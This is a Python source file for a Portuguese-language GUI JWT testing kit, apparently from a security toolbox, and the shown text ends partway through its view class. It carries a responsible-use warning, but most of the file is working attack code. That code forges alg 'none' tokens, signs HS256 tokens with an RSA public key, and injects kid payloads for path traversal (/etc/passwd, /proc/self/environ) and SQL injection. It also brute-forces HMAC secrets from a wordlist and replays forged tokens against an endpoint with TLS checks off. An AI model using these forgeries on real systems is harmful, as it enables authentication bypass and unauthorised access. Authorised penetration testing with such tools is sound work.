"""Ferramenta de análise e testes controlados de tokens JWT.

Implementa quatro verificações clássicas de robustez de JWT: algoritmo ``none``,
confusão entre HMAC e RSA, travessia de caminho no cabeçalho ``kid`` e força bruta
de segredo HMAC. Toda a criptografia usa apenas a biblioteca padrão (``hmac``,
``hashlib``, ``json`` e ``base64``), sem depender de ``pyjwt``. O endpoint de teste
opcional compara status e tamanho das respostas para indicar possível aceitação.
"""
from __future__ import annotations

import hashlib
import hmac
import json
import time
from dataclasses import asdict, dataclass, field
from html import escape
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple

from PySide6.QtGui import QBrush, QColor
from PySide6.QtWidgets import (
    QApplication,
    QFileDialog,
    QGridLayout,
    QHBoxLayout,
    QHeaderView,
    QLabel,
    QLineEdit,
    QPlainTextEdit,
    QProgressBar,
    QPushButton,
    QTableWidget,
    QTextBrowser,
    QWidget,
)

from wintoolbox.core.registry import Tool, register
from wintoolbox.tools._helpers import (
    base64url_decode,
    base64url_encode,
    confirmar_termo_etico,
)
from wintoolbox.tools._widgets import (
    PainelFerramenta,
    adicionar_log_painel,
    criar_aviso,
    criar_card,
    criar_saida_texto,
    criar_tabela,
    executar_assincrono,
    mostrar_erro,
    preencher_tabela,
)

ALGORITMOS_HMAC: Dict[str, Any] = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}

MAXIMO_TOKENS_ENDPOINT = 20
AGENTE_PADRAO = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36 WinToolbox/1.0"
)

TEXTO_AVISO = (
    "Aviso de uso responsável: esta ferramenta gera variações de tokens JWT e, "
    "opcionalmente, envia requisições de teste para um endpoint. Utilize apenas em "
    "sistemas dos quais você é proprietário ou para os quais possui autorização "
    "expressa e por escrito. A assinatura de tokens e a força bruta de segredos só "
    "devem ser executadas em ambientes de teste autorizados. Nenhum ataque é "
    "executado sem a sua confirmação."
)

# Segredos comuns usados em tutoriais e ambientes de demonstração. A lista é
# propositalmente curta e local, servindo para validar a robustez da chave.
SEGREDOS_COMUNS: Tuple[str, ...] = (
    "secret",
    "secretkey",
    "secret_key",
    "segredo",
    "segredo123",
    "senha",
    "senha123",
    "password",
    "password123",
    "passw0rd",
    "P@ssw0rd",
    "Senha@123",
    "123456",
    "1234567",
    "12345678",
    "123456789",
    "1234567890",
    "12345",
    "1234",
    "0000",
    "qwerty",
    "qwerty123",
    "abc123",
    "letmein",
    "welcome",
    "admin",
    "admin123",
    "root",
    "toor",
    "teste",
    "teste123",
    "test",
    "testing",
    "dev",
    "dev123",
    "development",
    "desenvolvimento",
    "hml",
    "homolog",
    "homologacao",
    "staging",
    "prod",
    "producao",
    "production",
    "local",
    "localhost",
    "default",
    "changeme",
    "change-me",
    "altere-me",
    "mudar123",
    "troque-este-segredo",
    "jwt",
    "jwtsecret",
    "jwt_secret",
    "jwt-secret",
    "JWT_SECRET",
    "jsonwebtoken",
    "token",
    "tokens",
    "auth",
    "authorization",
    "bearer",
    "apikey",
    "api_key",
    "api-key",
    "chave",
    "chavesecreta",
    "chave-secreta",
    "minha-chave",
    "minichave",
    "mysecret",
    "my_secret",
    "supersecret",
    "super-secret",
    "s3cr3t",
    "s3cr3t0",
    "your-256-bit-secret",
    "your_jwt_secret",
    "your-secret-key",
    "example",
    "exemplo",
    "sample",
    "demo",
    "app",
    "application",
    "backend",
    "frontend",
    "web",
    "api",
    "rest",
    "node",
    "nodejs",
    "python",
    "django",
    "flask",
    "fastapi",
    "spring",
    "laravel",
    "rails",
    "express",
    "supabase",
    "firebase",
    "cognito",
    "keycloak",
    "HS256",
)

CARGAS_KID: Tuple[str, ...] = (
    "../../../../../../dev/null",
    "../../../../../../etc/passwd",
    "../../../../../../proc/self/environ",
    "/dev/null",
    "/etc/passwd",
    "..%2f..%2f..%2f..%2fdev%2fnull",
    "....//....//....//....//dev/null",
    "file:///dev/null",
    "http://127.0.0.1:8080/chave",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\Windows\\win.ini",
    "../../../../windows/win.ini",
    "a' UNION SELECT 'segredo' --",
)


def limpar_token(texto: str) -> str:
    """Remove prefixo Bearer, aspas e espaços residuais do token informado."""
    valor = str(texto or "").strip().strip('"').strip("'")
    if valor.lower().startswith("bearer "):
        valor = valor[7:].strip()
    return "".join(valor.split())


def _json_bytes(dados: Dict[str, Any]) -> bytes:
    """Serializa um objeto JSON de forma compacta e determinística."""
    return json.dumps(dados, ensure_ascii=False, separators=(",", ":")).encode("utf-8")


def _decodificar_json(segmento: str, rotulo: str, problemas: List[str]) -> Dict[str, Any]:
    """Decodifica um segmento Base64URL em dicionário, registrando problemas."""
    try:
        bruto = base64url_decode(segmento)
    except Exception as exc:
        problemas.append(f"Falha ao decodificar {rotulo}: {exc}")
        return {}
    try:
        dados = json.loads(bruto.decode("utf-8", errors="replace"))
    except Exception as exc:
        problemas.append(f"Falha ao interpretar o JSON de {rotulo}: {exc}")
        return {}
    if not isinstance(dados, dict):
        problemas.append(f"O {rotulo} do token não é um objeto JSON.")
        return {}
    return dados


@dataclass
class TokenJWT:
    """Token JWT decodificado com os problemas estruturais identificados."""

    bruto: str
    cabecalho: Dict[str, Any]
    conteudo: Dict[str, Any]
    assinatura_b64: str
    assinatura: bytes
    problemas: List[str] = field(default_factory=list)

    @property
    def algoritmo(self) -> str:
        """Algoritmo declarado no cabeçalho, em maiúsculas."""
        return str(self.cabecalho.get("alg") or "").upper()

    @property
    def assinado(self) -> bool:
        """Indica se o token possui assinatura preenchida."""
        return bool(self.assinatura_b64)


def analisar_token(token: str) -> TokenJWT:
    """Decodifica o token e aponta problemas comuns de configuração."""
    valor = limpar_token(token)
    partes = valor.split(".")
    if len(partes) != 3:
        raise ValueError(
            "O token JWT deve ter exatamente três partes separadas por ponto "
            "(cabeçalho.conteúdo.assinatura)."
        )

    problemas: List[str] = []
    cabecalho = _decodificar_json(partes[0], "cabeçalho", problemas)
    conteudo = _decodificar_json(partes[1], "conteúdo", problemas)
    try:
        assinatura = base64url_decode(partes[2])
    except Exception as exc:
        problemas.append(f"Falha ao decodificar a assinatura: {exc}")
        assinatura = b""

    algoritmo = str(cabecalho.get("alg") or "")
    if algoritmo.lower() == "none":
        problemas.append(
            "O cabeçalho declara o algoritmo 'none', que não aplica assinatura alguma."
        )
    if not partes[2]:
        problemas.append("A assinatura está vazia.")
    if "exp" not in conteudo:
        problemas.append("O token não possui prazo de expiração (claim 'exp').")
    else:
        expiracao = conteudo.get("exp")
        if isinstance(expiracao, (int, float)) and float(expiracao) < time.time():
            problemas.append("O token está expirado pela claim 'exp'.")
    if "aud" not in conteudo:
        problemas.append("O token não restringe a audiência (claim 'aud').")
    if "iss" not in conteudo:
        problemas.append("O token não declara o emissor (claim 'iss').")
    if not algoritmo:
        problemas.append("O cabeçalho não declara o algoritmo de assinatura.")

    return TokenJWT(
        bruto=valor,
        cabecalho=cabecalho,
        conteudo=conteudo,
        assinatura_b64=partes[2],
        assinatura=assinatura,
        problemas=problemas,
    )


def _montar_token(
    cabecalho: Dict[str, Any],
    segmento_conteudo: str,
    assinatura: bytes,
) -> str:
    """Monta um token preservando o segmento de conteúdo original."""
    segmento_cabecalho = base64url_encode(_json_bytes(cabecalho))
    segmento_assinatura = base64url_encode(assinatura) if assinatura else ""
    return f"{segmento_cabecalho}.{segmento_conteudo}.{segmento_assinatura}"


def assinar_hmac(mensagem: bytes, segredo: bytes, algoritmo: str = "HS256") -> bytes:
    """Assina bytes com HMAC usando o algoritmo HS256, HS384 ou HS512."""
    funcao = ALGORITMOS_HMAC.get(str(algoritmo or "").upper())
    if funcao is None:
        raise ValueError(
            "Algoritmo HMAC não suportado. Utilize HS256, HS384 ou HS512."
        )
    return hmac.new(segredo, mensagem, funcao).digest()


@dataclass
class TokenGerado:
    """Token produzido por uma das técnicas de ataque."""

    ataque: str
    token: str
    descricao: str

    def para_linha(self) -> List[str]:
        """Converte o token gerado para a linha exibida na tabela."""
        return [self.ataque, self.token, self.descricao]


def gerar_tokens_alg_none(token: str) -> List[TokenGerado]:
    """Gera variações com algoritmo 'none', com e sem a assinatura original."""
    analise = analisar_token(token)
    segmento_conteudo = analise.bruto.split(".")[1]
    gerados: List[TokenGerado] = []
    for variante in ("none", "None", "NONE", "nOnE"):
        cabecalho = dict(analise.cabecalho)
        cabecalho["alg"] = variante
        sem_assinatura = _montar_token(cabecalho, segmento_conteudo, b"")
        gerados.append(
            TokenGerado(
                ataque="Algoritmo none",
                token=sem_assinatura,
                descricao=(
                    f"Algoritmo '{variante}' com assinatura vazia. "
                    "Testa servidores que aceitam tokens não assinados."
                ),
            )
        )
        if analise.assinatura_b64:
            com_assinatura = (
                f"{sem_assinatura.rsplit('.', 1)[0]}.{analise.assinatura_b64}"
            )
            gerados.append(
                TokenGerado(
                    ataque="Algoritmo none",
                    token=com_assinatura,
                    descricao=(
                        f"Algoritmo '{variante}' mantendo a assinatura original. "
                        "Testa validação que ignora a assinatura quando alg é none."
                    ),
                )
            )
    return gerados


def gerar_tokens_confusao_hmac_rsa(
    token: str, chave_publica_pem: str
) -> List[TokenGerado]:
    """Assina o token com HS256 usando a chave pública RSA como segredo HMAC."""
    pem = str(chave_publica_pem or "").strip()
    if not pem:
        raise ValueError(
            "Informe a chave pública RSA no formato PEM para simular a confusão HMAC/RSA."
        )

    analise = analisar_token(token)
    segmento_conteudo = analise.bruto.split(".")[1]
    cabecalho = dict(analise.cabecalho)
    cabecalho["alg"] = "HS256"

    corpo = "\n".join(
        linha
        for linha in pem.splitlines()
        if not linha.strip().startswith("-----")
    ).strip()

    variacoes = [
        ("PEM completo", pem),
        ("PEM com quebra de linha final", pem + "\n"),
        ("Apenas o corpo Base64 da chave", corpo),
    ]

    gerados: List[TokenGerado] = []
    for rotulo, segredo in variacoes:
        if not segredo:
            continue
        assinatura = assinar_hmac(
            f"{base64url_encode(_json_bytes(cabecalho))}.{segmento_conteudo}".encode("ascii"),
            segredo.encode("utf-8"),
            "HS256",
        )
        gerados.append(
            TokenGerado(
                ataque="Confusão HMAC/RSA",
                token=_montar_token(cabecalho, segmento_conteudo, assinatura),
                descricao=(
                    f"HS256 assinado com a chave pública ({rotulo}). "
                    "Testa bibliotecas que aceitam trocar RS256 por HS256."
                ),
            )
        )
    return gerados


def gerar_tokens_kid_traversal(
    token: str, cargas: Optional[Sequence[str]] = None
) -> List[TokenGerado]:
    """Gera tokens com valores de ``kid`` que tentam atravessar caminhos ou injetar SQL."""
    analise = analisar_token(token)
    segmento_conteudo = analise.bruto.split(".")[1]
    lista = list(cargas) if cargas is not None else list(CARGAS_KID)
    gerados: List[TokenGerado] = []
    for carga in lista:
        carga = str(carga or "").strip()
        if not carga:
            continue
        cabecalho = dict(analise.cabecalho)
        cabecalho["alg"] = "HS256"
        cabecalho["kid"] = carga
        for rotulo_segredo, segredo in (
            ("chave vazia", b""),
            ("segredo padrão", b"segredo"),
        ):
            assinatura = assinar_hmac(
                f"{base64url_encode(_json_bytes(cabecalho))}.{segmento_conteudo}".encode("ascii"),
                segredo,
                "HS256",
            )
            gerados.append(
                TokenGerado(
                    ataque="Travessia de kid",
                    token=_montar_token(cabecalho, segmento_conteudo, assinatura),
                    descricao=(
                        f"kid={carga} assinado com {rotulo_segredo}. "
                        "Testa leitura de chave a partir de caminho controlado."
                    ),
                )
            )
    return gerados


@dataclass
class ResultadoForcaBruta:
    """Resultado da tentativa de descobrir o segredo HMAC do token."""

    segredo: Optional[str]
    tentativas: int
    total: int
    algoritmo: str
    cancelado: bool
    duracao_s: float

    def resumo(self) -> str:
        """Texto descritivo do resultado da força bruta."""
        if self.segredo is not None:
            return (
                f"Segredo encontrado: {self.segredo!r} "
                f"({self.tentativas} de {self.total} tentativas, {self.duracao_s:.2f} s)."
            )
        if self.cancelado:
            return (
                f"Força bruta cancelada após {self.tentativas} de {self.total} tentativas."
            )
        return (
            f"Segredo não encontrado na wordlist ({self.total} tentativas, "
            f"{self.duracao_s:.2f} s). Considere uma wordlist personalizada."
        )


def forcar_segredo_hmac(
    token: str,
    segredos: Optional[Sequence[str]] = None,
    *,
    is_cancelled: Optional[Callable[[], bool]] = None,
    on_progress: Optional[Callable[[int, int, str], None]] = None,
    on_log: Optional[Callable[[str, str], None]] = None,
) -> ResultadoForcaBruta:
    """Tenta descobrir o segredo HMAC comparando assinaturas com uma wordlist local."""
    analise = analisar_token(token)
    algoritmo = analise.algoritmo
    if algoritmo not in ALGORITMOS_HMAC:
        raise ValueError(
            "A força bruta integrada só se aplica a tokens HS256, HS384 ou HS512. "
            f"O token informado usa '{algoritmo or 'algoritmo desconhecido'}'."
        )
    if not analise.assinatura_b64:
        raise ValueError("O token não possui assinatura para comparar.")

    lista: List[str] = []
    vistos = set()
    for bruto in (list(segredos) if segredos is not None else list(SEGREDOS_COMUNS)):
        segredo = str(bruto or "")
        if segredo in vistos:
            continue
        vistos.add(segredo)
        lista.append(segredo)

    def cancelado() -> bool:
        try:
            return bool(is_cancelled()) if callable(is_cancelled) else False
        except Exception:
            return False

    def logar(nivel: str, mensagem: str) -> None:
        if callable(on_log):
            on_log(nivel, mensagem)

    funcao = ALGORITMOS_HMAC[algoritmo]
    partes = analise.bruto.split(".")
    mensagem = f"{partes[0]}.{partes[1]}".encode("ascii")
    esperado = analise.assinatura
    total = len(lista)
    logar("INFO", f"Iniciando força bruta HMAC ({algoritmo}) com {total} segredo(s).")

    iniciou = time.perf_counter()
    tentativas = 0
    encontrado: Optional[str] = None
    cancelado_em = False
    for indice, segredo in enumerate(lista, start=1):
        if cancelado():
            cancelado_em = True
            break
        tentativas = indice
        calculado = hmac.new(segredo.encode("utf-8"), mensagem, funcao).digest()
        if hmac.compare_digest(calculado, esperado):
            encontrado = segredo
            break
        if callable(on_progress):
            on_progress(indice, total, f"{indice} de {total} segredos testados")

    duracao = time.perf_counter() - iniciou
    if encontrado is not None:
        logar("SUCESSO", f"Segredo HMAC encontrado após {tentativas} tentativa(s).")
    elif cancelado_em:
        logar("AVISO", "Força bruta cancelada pelo usuário.")
    else:
        logar("INFO", "Nenhum segredo da wordlist corresponde à assinatura.")

    return ResultadoForcaBruta(
        segredo=encontrado,
        tentativas=tentativas,
        total=total,
        algoritmo=algoritmo,
        cancelado=cancelado_em,
        duracao_s=duracao,
    )


@dataclass
class ResultadoEndpoint:
    """Resultado da submissão de um token a um endpoint de teste."""

    rotulo: str
    status: int
    tamanho: int
    tempo_ms: float
    destino: str
    observacao: str


def _classificar_resposta(
    status: int,
    tamanho: int,
    base: Optional[ResultadoEndpoint],
    referencia: Optional[ResultadoEndpoint],
) -> str:
    """Classifica a resposta comparando-a com a linha de base e o token de referência."""
    if status in (401, 403):
        return "Rejeitado (não autenticado)"
    if base is not None and status == base.status and abs(tamanho - base.tamanho) <= 32:
        return "Sem diferença em relação à requisição sem token"
    if referencia is not None and status == referencia.status and abs(
        tamanho - referencia.tamanho
    ) <= 32:
        return "Resposta equivalente ao token de referência"
    if 200 <= status < 400:
        return "Possível aceitação: resposta diferente da linha de base"
    return "Inconclusivo"


def testar_endpoint(
    url: str,
    tokens: Sequence[str],
    *,
    cabecalho: str = "Authorization",
    prefixo: str = "Bearer ",
    timeout: float = 8.0,
    token_referencia: Optional[str] = None,
    is_cancelled: Optional[Callable[[], bool]] = None,
    on_log: Optional[Callable[[str, str], None]] = None,
) -> List[ResultadoEndpoint]:
    """Envia tokens a um endpoint e compara status e tamanho das respostas.

    A operação é somente leitura (GET) e limitada a ``MAXIMO_TOKENS_ENDPOINT``
    variantes para evitar volume excessivo de requisições.
    """
    try:
        import requests
    except ImportError as exc:  # pragma: no cover - ambiente sem requests
        raise RuntimeError(
            "A biblioteca 'requests' é necessária para o teste de endpoint. "
            "Instale com: pip install requests"
        ) from exc

    try:
        import urllib3

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except Exception:
        pass

    destino = str(url or "").strip()
    if not destino:
        raise ValueError("Informe a URL do endpoint de teste.")
    nome_cabecalho = str(cabecalho or "Authorization").strip() or "Authorization"

    def cancelado() -> bool:
        try:
            return bool(is_cancelled()) if callable(is_cancelled) else False
        except Exception:
            return False

    def logar(nivel: str, mensagem: str) -> None:
        if callable(on_log):
            on_log(nivel, mensagem)

    sessao = requests.Session()
    sessao.headers.update({"User-Agent": AGENTE_PADRAO, "Connection": "close"})

    def medir(rotulo: str, token: Optional[str]) -> ResultadoEndpoint:
        if cancelado():
            return ResultadoEndpoint(rotulo, 0, 0, 0.0, destino, "Cancelado")
        cabecalhos = {nome_cabecalho: f"{prefixo}{token}"} if token else {}
        inicio = time.perf_counter()
        try:
            resposta = sessao.get(
                destino,
                headers=cabecalhos,
                timeout=max(1.0, float(timeout)),
                allow_redirects=True,
                verify=False,
            )
        except Exception as exc:
            duracao = (time.perf_counter() - inicio) * 1000.0
            logar("AVISO", f"Falha ao testar o endpoint com '{rotulo}': {exc}")
            return ResultadoEndpoint(
                rotulo, 0, 0, duracao, destino, f"Falha de rede: {exc}"
            )
        duracao = (time.perf_counter() - inicio) * 1000.0
        try:
            tamanho = len(resposta.content)
        except Exception:
            tamanho = 0
        return ResultadoEndpoint(
            rotulo=rotulo,
            status=int(resposta.status_code),
            tamanho=tamanho,
            tempo_ms=duracao,
            destino=str(resposta.url),
            observacao="",
        )

    resultados: List[ResultadoEndpoint] = []
    try:
        base = medir("Sem token", None)
        resultados.append(base)
        referencia: Optional[ResultadoEndpoint] = None
        if token_referencia:
            referencia = medir("Token de referência", limpar_token(token_referencia))
            resultados.append(referencia)

        lista = [limpar_token(token) for token in tokens if limpar_token(token)]
        for indice, token in enumerate(lista[:MAXIMO_TOKENS_ENDPOINT], start=1):
            if cancelado():
                break
            resultado = medir(f"Variante {indice}", token)
            resultados.append(resultado)

        for resultado in resultados:
            if resultado.observacao:
                continue
            if resultado.rotulo == "Sem token":
                resultado.observacao = "Linha de base coletada"
            elif resultado.rotulo == "Token de referência":
                resultado.observacao = "Referência coletada"
            else:
                resultado.observacao = _classificar_resposta(
                    resultado.status, resultado.tamanho, base, referencia
                )
    finally:
        try:
            sessao.close()
        except Exception:
            pass

    logar("INFO", f"Teste de endpoint concluído com {len(resultados)} medição(ões).")
    return resultados


def descrever_claims(conteudo: Dict[str, Any]) -> List[List[str]]:
    """Converte as claims em linhas legíveis para a tabela."""
    rotulos = {
        "iss": "Emissor",
        "sub": "Assunto",
        "aud": "Audiência",
        "exp": "Expiração",
        "nbf": "Não antes de",
        "iat": "Emitido em",
        "jti": "Identificador do token",
        "scope": "Escopos",
        "roles": "Papéis",
        "role": "Papel",
        "email": "E-mail",
        "name": "Nome",
    }
    linhas: List[List[str]] = []
    for chave, valor in conteudo.items():
        observacao = rotulos.get(chave, "")
        if chave in ("exp", "nbf", "iat") and isinstance(valor, (int, float)):
            try:
                formatado = time.strftime("%d/%m/%Y %H:%M:%S", time.localtime(float(valor)))
            except (OverflowError, OSError, ValueError):
                formatado = str(valor)
            if chave == "exp":
                observacao = (
                    "Token expirado" if float(valor) < time.time() else "Token válido"
                )
            linhas.append([chave, formatado, observacao])
            continue
        if isinstance(valor, (list, tuple)):
            texto = ", ".join(str(item) for item in valor)
        elif isinstance(valor, dict):
            texto = json.dumps(valor, ensure_ascii=False)
        else:
            texto = str(valor)
        linhas.append([chave, texto, observacao])
    return linhas


def colorir_token_html(token: str, legenda: bool = True) -> str:
    """Devolve o token em HTML com as três partes destacadas por cor."""
    valor = limpar_token(token)
    partes = valor.split(".")
    cores = ("#60a5fa", "#34d399", "#f59e0b")
    rotulos = ("cabeçalho", "conteúdo", "assinatura")
    if len(partes) != 3:
        return (
            '<div style="font-family:Consolas,monospace;font-size:12px;">'
            f"{escape(valor or 'token vazio')}</div>"
        )
    blocos: List[str] = []
    for parte, cor in zip(partes, cores):
        texto = escape(parte) if parte else "(vazia)"
        blocos.append(
            f'<span style="color:{cor};font-weight:600;">{texto}</span>'
        )
    separador = '<span style="color:#9ca3af;">.</span>'
    corpo = separador.join(blocos)
    html = (
        '<div style="font-family:Consolas,monospace;font-size:12px;'
        'word-wrap:break-word;">'
        f"{corpo}</div>"
    )
    if legenda:
        itens = " ".join(
            f'<span style="color:{cor};font-weight:600;">{rotulo}</span>'
            for cor, rotulo in zip(cores, rotulos)
        )
        html += (
            '<div style="font-size:10px;color:#9ca3af;margin-top:6px;">'
            f"Partes: {itens}</div>"
        )
    return html


def cor_ataque(ataque: str) -> Optional[str]:
    """Define uma cor de destaque para o tipo de ataque na tabela."""
    return {
        "Algoritmo none": "#f59e0b",
        "Confusão HMAC/RSA": "#ef4444",
        "Travessia de kid": "#3b82f6",
    }.get(ataque)


@register
class JwtToolkitTool(Tool):
    """Ferramenta de análise e testes controlados de tokens JWT."""

    id = "web.jwt_toolkit"
    name = "Kit de Testes JWT"
    category = "Web"
    description = (
        "Análise de tokens JWT e simulação de quatro ataques: algoritmo none, "
        "confusão HMAC/RSA, travessia de kid e força bruta de segredo HMAC, "
        "com teste opcional de endpoint e comparação de status e tamanho"
    )
    keywords = [
        "jwt",
        "token",
        "json web token",
        "jwt none",
        "confusão de algoritmo",
        "kid",
        "hmac",
        "rsa",
        "força bruta",
        "forca bruta",
        "autenticação",
        "autenticacao",
        "web",
    ]
    optional_deps = ["requests"]

    def build_view(self, parent: Optional[QWidget] = None) -> QWidget:
        """Cria a página da ferramenta."""
        return JwtToolkitView(self, parent)


class JwtToolkitView(PainelFerramenta):
    """Interface de análise, geração de variantes e teste de endpoint JWT."""

    def __init__(self, tool: JwtToolkitTool, parent: Optional[QWidget] = None) -> None:
        super().__init__(tool, parent)
        self._analise: Optional[TokenJWT] = None
        self._tokens: List[TokenGerado] = []
        self._construir_interface()

    def _construir_interface(self) -> None:
        """Monta todos os cartões e controles da página."""
        self.adicionar(criar_aviso(TEXTO_AVISO, self, destaque=True))

        cartao_token, layout_token = criar_card("Token JWT de entrada", self)
        self.adicionar(cartao_token)

        self.txt_token = QPlainTextEdit()
        self.txt_token.setPlaceholderText(
            "Cole aqui o token JWT (cabeçalho.conteúdo.assinatura). O prefixo Bearer é aceito."
        )
        self.txt_token.setFixedHeight(90)
        layout_token.addWidget(self.txt_token)

        linha_acoes = QHBoxLayout()
        self.btn_analisar = QPushButton("Analisar token")
        self.btn_analisar.setProperty("class", "primary")
        self.btn_analisar.clicked.connect(self._analisar)
        linha_acoes.addWidget(self.btn_analisar)
        self.btn_limpar = QPushButton("Limpar")
        self.btn_limpar.clicked.connect(self._limpar)
        linha_acoes.addWidget(self.btn_limpar)
        linha_acoes.addStretch(1)
        layout_token.addLayout(linha_acoes)

        cartao_previa, layout_previa = criar_card("Token colorido em três partes", self)
        self.adicionar(cartao_previa)
        self.previa = QTextBrowser()
        self.previa.setOpenExternalLinks(False)
        self.previa.setMinimumHeight(90)
        self.previa.setHtml(
            '<div style="color:#9ca3af;font-size:11px;">'
            "O token decodificado será exibido aqui com as cores de cada parte.</div>"
        )
        layout_previa.addWidget(self.previa)

        cartao_campos, layout_campos = criar_card("Cabeçalho e conteúdo", self)
        self.adicionar(cartao_campos)
        self.tabela_campos: QTableWidget = criar_tabela(
            ["Seção", "Campo", "Valor", "Observação"]
        )
        cabecalho_campos = self.tabela_campos.horizontalHeader()
        cabecalho_campos.setSectionResizeMode(0, QHeaderView.ResizeToContents)
        cabecalho_campos.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        cabecalho_campos.setSectionResizeMode(2, QHeaderView.Stretch)
        cabecalho_campos.setSectionResizeMode(3, QHeaderView.ResizeToContents)
        self.tabela_campos.setMinimumHeight(150)
        layout_campos.addWidget(self.tabela_campos)

        layout_campos.addWidget(QLabel("Resumo da análise:"))
        self.saida_analise = criar_saida_texto(110)
        self.saida_analise.setPlainText(
            "Analise um token para ver o resumo e os problemas identificados."
        )
        layout_campos.addWidget(self.saida_analise)

        cartao_ataques, layout_ataques = criar_card("Ataques disponíveis", self)
        self.adicionar(cartao_ataques)

        layout_ataques.addWidget(QLabel("Chave pública RSA (PEM) para a confusão HMAC/RSA:"))
        self.txt_chave = QPlainTextEdit()
        self.txt_chave.setPlaceholderText(
            "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"
        )
        self.txt_chave.setFixedHeight(80)
        layout_ataques.addWidget(self.txt_chave)

        linha_botoes = QHBoxLayout()
        self.btn_none = QPushButton("Gerar variações 'none'")
        self.btn_none.clicked.connect(self._atacar_none)
        linha_botoes.addWidget(self.btn_none)
        self.btn_confusao = QPushButton("Confusão HMAC/RSA")
        self.btn_confusao.clicked.connect(self._atacar_confusao)
        linha_botoes.addWidget(self.btn_confusao)
        self.btn_kid = QPushButton("Travessia de kid")
        self.btn_kid.clicked.connect(self._atacar_kid)
        linha_botoes.addWidget(self.btn_kid)
        self.btn_forca_bruta = QPushButton("Força bruta HMAC")
        self.btn_forca_bruta.clicked.connect(self._atacar_forca_bruta)
        linha_botoes.addWidget(self.btn_forca_bruta)
        linha_botoes.addStretch(1)
        layout_ataques.addLayout(linha_botoes)

        self.progresso = QProgressBar()
        self.progresso.setRange(0, 100)
        self.progresso.setValue(0)
        self.progresso.setFormat("%v de %m")
        layout_ataques.addWidget(self.progresso)

        self.tabela_tokens: QTableWidget = criar_tabela(
            ["Ataque", "Token gerado", "Observação"]
        )
        cabecalho_tokens = self.tabela_tokens.horizontalHeader()
        cabecalho_tokens.setSectionResizeMode(0, QHeaderView.ResizeToContents)
        cabecalho_tokens.setSectionResizeMode(1, QHeaderView.Stretch)
        cabecalho_tokens.setSectionResizeMode(2, QHeaderView.Stretch)
        self.tabela_tokens.setMinimumHeight(190)
        layout_ataques.addWidget(self.tabela_tokens)

        linha_exportar = QHBoxLayout()
        self.btn_copiar = QPushButton("Copiar token selecionado")
        self.btn_copiar.setEnabled(False)
        self.btn_copiar.clicked.connect(self._copiar_token)
        linha_exportar.addWidget(self.btn_copiar)
        self.btn_exportar = QPushButton("Exportar tokens (JSON)...")
        self.btn_exportar.setEnabled(False)
        self.btn_exportar.clicked.connect(self._exportar_tokens)
        linha_exportar.addWidget(self.btn_exportar)
        linha_exportar.addStretch(1)
        layout_ataques.addLayout(linha_exportar)
        self.tabela_tokens.itemSelectionChanged.connect(self._ao_selecionar_token)

        cartao_endpoint, layout_endpoint = criar_card("Teste de endpoint (opcional)", self)
        self.adicionar(cartao_endpoint)
        grade = QGridLayout()
        grade.setHorizontalSpacing(10)
        grade.setVerticalSpacing(8)
        grade.addWidget(QLabel("URL do endpoint:"), 0, 0)
        self.txt_endpoint = QLineEdit()
        self.txt_endpoint.setPlaceholderText("https://exemplo.com/api/perfil")
        grade.addWidget(self.txt_endpoint, 0, 1)
        grade.addWidget(QLabel("Cabeçalho:"), 0, 2)
        self.txt_cabecalho = QLineEdit("Authorization")
        self.txt_cabecalho.setFixedWidth(140)
        grade.addWidget(self.txt_cabecalho, 0, 3)
        layout_endpoint.addLayout(grade)

        linha_endpoint = QHBoxLayout()
        self.btn_testar = QPushButton("Testar endpoint com os tokens gerados")
        self.btn_testar.clicked.connect(self._testar_endpoint)
        linha_endpoint.addWidget(self.btn_testar)
        self.btn_cancelar = QPushButton("Cancelar")
        self.btn_cancelar.setEnabled(False)
        self.btn_cancelar.clicked.connect(self._cancelar)
        linha_endpoint.addWidget(self.btn_cancelar)
        linha_endpoint.addStretch(1)
        layout_endpoint.addLayout(linha_endpoint)

        self.saida_endpoint = criar_saida_texto(140)
        self.saida_endpoint.setPlainText(
            "O resultado do teste de endpoint será exibido aqui, com status e tamanho de cada resposta."
        )
        layout_endpoint.addWidget(self.saida_endpoint)

        self._log = adicionar_log_painel(self, "Log de execução")
        self.adicionar_espaco()

    def _confirmar(self) -> bool:
        """Solicita o termo de responsabilidade antes de qualquer ataque."""
        if confirmar_termo_etico(self, self.tool.id):
            return True
        self._log.append_log(
            "AVISO", "Execução recusada: termo de responsabilidade não aceito."
        )
        return False

    def _token_atual(self) -> str:
        """Lê e normaliza o token digitado, informando erro quando inválido."""
        token = limpar_token(self.txt_token.toPlainText())
        if not token:
            raise ValueError("Cole o token JWT antes de executar esta ação.")
        return token

    def _analisar(self) -> None:
        """Decodifica o token, atualiza a prévia colorida, a tabela e o resumo."""
        try:
            analise = analisar_token(self.txt_token.toPlainText())
        except ValueError as exc:
            mostrar_erro(self, "Token inválido", exc)
            return

        self._analise = analise
        self.previa.setHtml(colorir_token_html(analise.bruto))

        linhas: List[List[str]] = []
        for campo, valor in analise.cabecalho.items():
            texto = (
                json.dumps(valor, ensure_ascii=False)
                if isinstance(valor, (dict, list))
                else str(valor)
            )
            linhas.append(["Cabeçalho", campo, texto, ""])
        linhas.extend([["Conteúdo", *linha] for linha in descrever_claims(analise.conteudo)])
        preencher_tabela(self.tabela_campos, linhas)

        resumo = [
            f"Algoritmo: {analise.algoritmo or 'não informado'}",
            f"Assinatura presente: {'sim' if analise.assinado else 'nao'}",
            f"Tamanho do token: {len(analise.bruto)} caracteres",
            "",
            f"Problemas identificados: {len(analise.problemas)}",
        ]
        if analise.problemas:
            resumo.extend(f"  - {problema}" for problema in analise.problemas)
        else:
            resumo.append("  Nenhum problema estrutural evidente.")
        self.saida_analise.setPlainText("\n".join(resumo))
        self._log.append_log("INFO", "Token analisado com sucesso.")

    def _limpar(self) -> None:
        """Limpa todos os campos e resultados da página."""
        self.txt_token.clear()
        self.txt_chave.clear()
        self.txt_endpoint.clear()
        self.previa.setHtml(
            '<div style="color:#9ca3af;font-size:11px;">'
            "O token decodificado será exibido aqui com as cores de cada parte.</div>"
        )
        self.tabela_campos.setRowCount(0)
        self.tabela_tokens.setRowCount(0)
